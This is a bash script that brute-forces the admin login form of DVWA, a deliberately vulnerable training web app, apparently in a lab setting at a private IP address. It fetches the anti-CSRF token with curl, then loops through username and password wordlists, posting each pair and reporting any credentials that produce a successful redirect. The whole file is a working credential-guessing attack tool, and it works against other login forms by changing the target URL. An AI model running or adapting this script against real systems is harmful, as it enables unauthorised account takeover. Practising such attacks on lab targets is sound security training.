#!/bin/bash
# Bruteforce the Admin login HTTP FORM of the DVWA 1.10+
# (https://github.com/digininja/DVWA) with security set to "impossible"
# using only curl because hydra wouldn't work for me Q.Q...
# Stolen and modified from g0tmi1k (https://blog.g0tmi1k.com/) for the initial PoC

# Edit those to your needs. rockyou.txt worked well for me as a password list so far.
TARGET_URL="http://10.10.170.123"
USER_LIST="/usr/share/wordlists/usernames.txt"
PASS_LIST="/usr/share/seclists/passwords_top_10000.txt"

# Value to look for in response (Whitelisting), since every response has the same size:
MSG_SUCCESS="Location: index.php"

# Set a few colors for console output...
OKAY="$(tput setaf 2)[OK]$(tput sgr0)"
ERROR="$(tput setaf 1)[E]$(tput sgr0)"
INFO="$(tput setaf 3)[I]$(tput sgr0)"

# Get the Anti CSRF token and save it to /tmp
CSRF="$( curl -s -c /tmp/dvwa.cookie "${TARGET_URL}/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2 )"
[[ "$?" -ne 0 ]] && echo -e "\n${ERROR} Issue connecting! #1" && exit 1

# initialize counter
i=0

# Password loop...
while read -r _PASS; do

  # Username loop...
  while read -r _USER; do

    # Increase counter
    ((i=i+1))

    # Output feedback for user
    echo "${INFO} Try ${i}: ${_USER} -/- ${_PASS}"

    # Connect to server
    REQUEST="$( curl -s -i -b /tmp/dvwa.cookie --data "username=${_USER}&password=${_PASS}&user_token=${CSRF}&Login=Login" "${TARGET_URL}/login.php" )"
    [[ $? -ne 0 ]] && echo -e "\n${ERROR} Issue connecting! #2"

    # Check if "Location:" in our response points to "/index.php":
    echo "${REQUEST}" | grep -q "${MSG_SUCCESS}"
    if [[ "$?" -eq 0 ]]; then
      # Yay, gotcha! Output our findings:
      echo -e "\n\n${INFO} Working credentials found!"
      echo "${OKAY} Username: ${_USER}"
      echo "${OKAY} Password: ${_PASS}"
      break 2
    fi

  done < ${USER_LIST}
done < ${PASS_LIST}

# Clean up the token we saved:
rm -f /tmp/dvwa.cookie
